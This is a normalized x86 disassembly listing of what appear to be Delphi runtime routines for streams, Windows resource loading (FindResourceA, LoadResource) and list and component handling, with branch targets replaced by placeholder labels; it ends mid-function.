jne r-xdata
sub_416204
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_4028b8
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_416124
sub_416254
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030d4
lea eax [ edi + 0x4 ]
mov edx esi
call sub_403ea8
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_416298
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_404114
mov esi eax
sub esi [ ebx + 0x8 ]
cmp edi esi
jge r-xdata
lea eax [ ebx + 0x4 ]
call j_sub_404320#2
mov edx [ ebx + 0x8 ]
add eax edx
mov edx ebp
mov ecx esi
call sub_4028b8
add [ ebx + 0x8 ] esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi edi
sub_4162d8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi ecx
mov edx [ ebx + 0x8 ]
add edx esi
lea eax [ ebx + 0x4 ]
call sub_4044a0
lea eax [ ebx + 0x4 ]
call j_sub_404320#2
mov edx [ ebx + 0x8 ]
lea edx [ eax + edx ]
mov eax edi
mov ecx esi
call sub_4028b8
add [ ebx + 0x8 ] esi
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_416310
push ebx
push esi
mov esi edx
mov ebx eax
sub cx 0x1
jb r-xdata
mov [ ebx + 0x8 ] esi
jmp r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_404114
cmp eax [ ebx + 0x8 ]
jge r-xdata
add [ ebx + 0x8 ] esi
jmp r-xdata
dec cx
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jge r-xdata
mov eax [ ebx + 0x4 ]
call sub_404114
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov eax [ ebx + 0x4 ]
call sub_404114
sub eax esi
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov eax [ ebx + 0x8 ]
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x8 ] eax
sub_416368
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x4 ]
mov edx esi
call sub_4044a0
cmp esi [ ebx + 0x8 ]
jge r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] esi
sub_416384
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030d4
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
call sub_404314
mov ecx eax
mov edx esi
mov eax edi
call sub_41644c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_4163dc
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41643f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b55c
call sub_403890
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416446
lea eax [ ebp - 0xc ]
call sub_403e54
retn
sub_41644c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_4163dc
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_416044
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebp
call sub_4163dc
pop ecx
sub_4164b8
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_4067dc
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030f4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_416508
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_4026bc
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_416550
push ebx
push esi
call sub_403490
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_4026dc
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_416654
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_403ea8
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_403ea8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_4166ac
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_403f44
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_4043b4
mov al 0x1
inc ebx
sub_416704
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41677b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4054f4
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_411114
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416782
lea eax [ ebp - 0x4 ]
call sub_4054f4
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_410a24
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_4054f4
mov ecx eax
mov eax esi
pop edx
call sub_40d0ac
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_4054f4
sub_416788
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41682e
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416835
lea eax [ ebp - 0x8 ]
call sub_403e54
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_403f44
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_419d5c
mov esi eax
test esi esi
jne r-xdata
add dl 0xd3
sub dl 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_407b44
test al al
je r-xdata
inc ebx
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_416850
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_413dc8
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_413dc8
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_413c10
sub_416888
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_413dc8
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_413dc8
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_413c5c
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_413c10
sub_4168d0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_416a69
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
call sub_4140d8
mov edi eax
xor edx edx
push ebp
push sub_416a4a
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416a51
mov eax [ rw-data ]
call sub_41413c
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_416a2b
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_4169d9
push [ fs : edx ]
mov [ fs : edx ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_413d6c
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_4138b8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4169e0
mov eax [ ebp - 0x8 ]
call sub_403104
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_410b50
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_416850
pop ecx
mov edx esi
mov eax edi
call sub_413c5c
mov eax ebx
call sub_403104
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_416788
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
push ebp
mov eax [ ebx + 0x4 ]
call sub_416888
pop ecx
inc esi
sub_4169e0
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403104
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_413d6c
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
sub_416a78
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_4140d8
mov edi eax
xor eax eax
push ebp
push sub_416b13
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41413c
retn
mov edx ebx
mov eax edi
call sub_413d6c
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_413c5c
mov eax esi
call sub_403104
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_407b44
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_416b24
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_4140d8
mov edi eax
xor eax eax
push ebp
push sub_416b9b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41413c
retn
mov edx ebx
mov eax edi
call sub_413d6c
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_413c5c
mov eax esi
call sub_403104
sub_416bcc
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b618
call sub_403890
pop ecx
pop edx
pop ebx
retn
sub_416c10
push ebx
push esi
push edi
call sub_403490
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_416550
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403478
sub_416c4c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_418b24
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_418c34
call sub_416bc0
sub_416c70
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_407b44
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x70 ]
call sub_403e54
sub_416ca4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_407b44
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_418b24
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_416d65
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_4170e8
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4170e8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416d6c
mov eax [ ebp - 0x8 ]
call sub_403104
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_418c34
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
call sub_416bc0
sub_416d94
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_416db4
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_4040f0
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_403388
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
call sub_416bc0
sub_416e1c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_4140d8
mov esi eax
xor edx edx
push ebp
push sub_416e8c
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416e93
mov eax [ rw-data ]
call sub_41413c
retn
mov edx ebx
mov eax esi
call sub_413d6c
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_403104
mov edx ebx
mov eax esi
call sub_413c5c
sub_416e98
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_416fa7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416fae
lea eax [ ebp - 0x8 ]
call sub_403e54
retn
xor edx edx
push ebp
push sub_416f8a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_416fdc
retn
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_4166ac
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_413d6c
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x14 ]
call sub_403eec
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_416788
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_413d6c
call sub_416e1c
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_413d6c
mov edx eax
mov eax [ rw-data ]
call sub_414050
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_413e60
jmp r-xdata
inc esi
dec [ ebp - 0xc ]
jne r-xdata
sub_416fb8
push ebx
mov ebx eax
mov eax ebx
call sub_4170ac
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_4159e4
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_416fdc
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_403104
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_413d6c
call sub_403104
inc edi
dec esi
jne r-xdata
sub_417018
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_40304c
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_413400
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x74 ]
test eax eax
je r-xdata
mov eax ebp
call sub_403090
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_413478
mov edi eax
mov edx [ esp + 0x4 ]
call sub_413378
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_403068
test al al
jne r-xdata
sub_4170e8
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_417134
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_417134
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5dc
call sub_403890
sub_417184
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4171cf
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_418984
mov eax [ ebp - 0x4 ]
call sub_404114
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4171d6
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
call sub_416bc0
sub_4171dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41727c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_416d80
test al al
jne r-xdata
mov eax ebx
call sub_416d80
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4145a4
jmp r-xdata
mov eax ebx
call sub_4170c4
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_417cec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417283
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_414584
mov esi eax
mov eax ebx
call sub_417ce4
jmp r-xdata
mov eax ebx
call sub_417c34
mov eax ebx
call sub_416d80
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_417e50
mov eax ebx
call sub_417cec
sub_4172ac
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404c4c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_413c10
inc esi
dec ebx
jne r-xdata
sub_4172e8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_419e78
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404c4c
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404e08
add esp 0x4
mov edx ebx
mov eax edi
call sub_419e4c
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404c4c
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_419e4c
test [ eax + 0x24 ] 0x4
je r-xdata
sub_417360
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404c4c
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_4173c8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_4173e8
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_40274c
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_4173c8
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_418e18
call sub_40274c
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_403104
sub_417448
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41752e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
